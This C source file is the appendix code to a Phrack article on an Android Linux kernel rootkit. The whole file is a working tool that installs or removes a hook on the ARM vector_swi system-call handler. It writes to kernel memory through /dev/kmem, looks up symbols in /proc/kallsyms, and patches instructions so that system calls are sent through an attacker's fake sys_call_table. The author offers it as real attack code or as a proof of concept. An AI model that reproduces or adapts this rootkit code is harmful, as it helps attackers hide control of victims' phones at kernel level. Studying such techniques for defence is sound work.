/*
**
** This is appendix of the Phrack (www.phrack.org) article:
** Android platform based linux kernel rootkit
** vector_swi handler hooking code installer & uninstaller
**
** All the tests were done on Motoroi XT720 model(2.6.29-omap1 kernel)
** and Galaxy S SHW-M110S model(2.6.32.9 kernel).
** Note that some contents may not apply to all smart platform machines
** and there are some bugs you can modify.
**
** This code can be used as a real code for attack or just a proof-of-
** concept code. I wish you use this code only for your study not for a bad
** purpose.
**
** USE IT AT YOUR OWN RISK!
**
** --
** by "dong-hoon you" (Xpl017Elz), <x82@inetcop.org>
** My World: http://x82.inetcop.org
**
*/

#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>

#define __NR_GETUID 199
#define __NR_WRITEV 146
#define __NR_KILL 37
#define __NR_GETDENTS64 217

#define MAP_SIZE 4096UL
#define MAP_MASK (MAP_SIZE - 1)

/* read data from kmem */
void read_kmem(unsigned char *m,unsigned off,int sz)
{
	int i;
	void *buf,*v_addr;
	int kmem=open("/dev/kmem",O_RDWR|O_SYNC);
	if(kmem<0){
		return;
	}
	if((buf=mmap(0,MAP_SIZE*2,PROT_READ|PROT_WRITE,MAP_SHARED,kmem,off&~MAP_MASK))==(void *)-1){
		perror("read: mmap error");
		exit(0);
	}
	for(i=0;i<sz;i++){
		v_addr=buf+(off&MAP_MASK)+i;
		m[i]=*((unsigned char *)v_addr);
	}
	if(munmap(buf,MAP_SIZE*2)==-1){
		perror("read: munmap error");
		exit(0);
	}
	close(kmem);
}

/* write data to kmem */
void write_kmem(unsigned char *m,unsigned off,int sz)
{
	int i;
	void *buf,*v_addr;
	int kmem=open("/dev/kmem",O_RDWR|O_SYNC);
	if(kmem<0){
		return;
	}
	if((buf=mmap(0,MAP_SIZE*2,PROT_READ|PROT_WRITE,MAP_SHARED,kmem,off&~MAP_MASK))==(void *)-1){
		perror("write: mmap error");
		exit(0);
	}
	for(i=0;i<sz;i++){
		v_addr=buf+(off&MAP_MASK)+i;
		*((unsigned char *)v_addr)=m[i];
	}
	if(munmap(buf,MAP_SIZE*2)==-1){
		perror("write: munmap error");
		exit(0);
	}
	close(kmem);
}

/* write int to kmem */
void write_kmem2(unsigned long m,unsigned long off)
{
	void *buf,*v_addr;
	int kmem=open("/dev/kmem",O_RDWR|O_SYNC);
	if(kmem<0){
		return;
	}
	if((buf=mmap(0,MAP_SIZE*2,PROT_READ|PROT_WRITE,MAP_SHARED,kmem,off&~MAP_MASK))==(void *)-1){
		perror("write: mmap error");
		exit(0);
	}
	v_addr=buf+(off&MAP_MASK);
	*((unsigned long *)v_addr)=m;
	if(munmap(buf,MAP_SIZE*2)==-1){
		perror("write: munmap error");
		exit(0);
	}
	close(kmem);
}

unsigned long get_kernel_symbol(char *sym_name){
	FILE *fp;
	unsigned char buf[256];
	unsigned char symbol_name[256];
	unsigned long addr=0;

	memset(symbol_name,0,sizeof(symbol_name));
	snprintf(symbol_name,sizeof(symbol_name)-1," %s",sym_name);

	if((fp=fopen("/proc/kallsyms","r"))==NULL){
		exit(-1);
	}
	while(fgets(buf,sizeof(buf)-1,fp)){
		if(strstr(buf,symbol_name)){
			sscanf(buf,"%x ",&addr);
			break;
		}
	}
	fclose(fp);
	return addr;
}

void install_hooker(){
	void *swi_addr=(long *)0xffff0008;
	unsigned long offset=0;
	unsigned long *vector_swi_addr=0,*ptr;
	unsigned char buf[MAP_SIZE+1];
	unsigned long modify_addr1=0;
	unsigned long modify_addr2=0;
	unsigned long addr=0;
	char *addr_ptr;

	offset=((*(long *)swi_addr)&0xfff)+8;
	vector_swi_addr=*(unsigned long *)(swi_addr+offset);

	memset((char *)buf,0,sizeof(buf));
	read_kmem(buf,(long)vector_swi_addr,MAP_SIZE);
	ptr=(unsigned long *)buf;

	/* get the address of ldr that handles sys_call_table */
	while(ptr){
		if(((*(unsigned long *)ptr)&0xfffff000)==0xe28f8000){
			modify_addr1=(unsigned long)vector_swi_addr;
			break;
		}
		ptr++;
		vector_swi_addr++;
	}
	/* get the address of nop that will be overwritten */
	while(ptr){
		if(*(unsigned long *)ptr==0xe320f000){ /* nop */
			modify_addr2=(unsigned long)vector_swi_addr;
			break;
		}
		ptr++;
		vector_swi_addr++;
	}

	/* overwrite nop with hacked_sys_call_table */
	write_kmem2((char *)get_kernel_symbol("hacked_sys_call_table"),modify_addr2);

	/* calculate fake table offset */
	offset=modify_addr2-modify_addr1-8;

	/* change sys_call_table offset into fake table offset */
	addr=0xe59f8000+offset; /* ldr r8, [pc, #offset] */
	write_kmem2(addr,modify_addr1);

	return;
}

void uninstall_hooker(){
	void *swi_addr=(long *)0xffff0008;
	unsigned long offset=0;
	unsigned long *vector_swi_addr=0,*ptr;
	unsigned char buf[MAP_SIZE+1];
	unsigned long modify_addr=0;
	unsigned long sys_call_table=0;
	unsigned long addr=0;
	char *addr_ptr;

	offset=((*(long *)swi_addr)&0xfff)+8;
	vector_swi_addr=*(unsigned long *)(swi_addr+offset);

	memset((char *)buf,0,sizeof(buf));
	read_kmem(buf,(long)vector_swi_addr,MAP_SIZE);
	ptr=(unsigned long *)buf;

	while(ptr){
		if(((*(unsigned long *)ptr)&0xfffff000)==0xe59f8000){
			modify_addr=(unsigned long)vector_swi_addr;
			break;
		}
		ptr++;
		vector_swi_addr++;
	}

	sys_call_table=get_kernel_symbol("sys_call_table");
	offset=sys_call_table-modify_addr-8;

	addr=0xe28f8000+offset; /* add r8, pc, #offset */
	write_kmem2(addr,modify_addr);

	return;
}

void modify_vector_swi_sct(int c){
	if(c=='I'||c=='i'){
		install_hooker();
	} else if(c=='U'||c=='u'){
		uninstall_hooker();
	}
}

int main(int argc,char *argv[])
{
	nice(-20); // setting priority
	if(argc<2){
		printf("%s [I or U]\n",argv[0]);
		exit(0);
	}
	modify_vector_swi_sct(argv[1][0]);
}

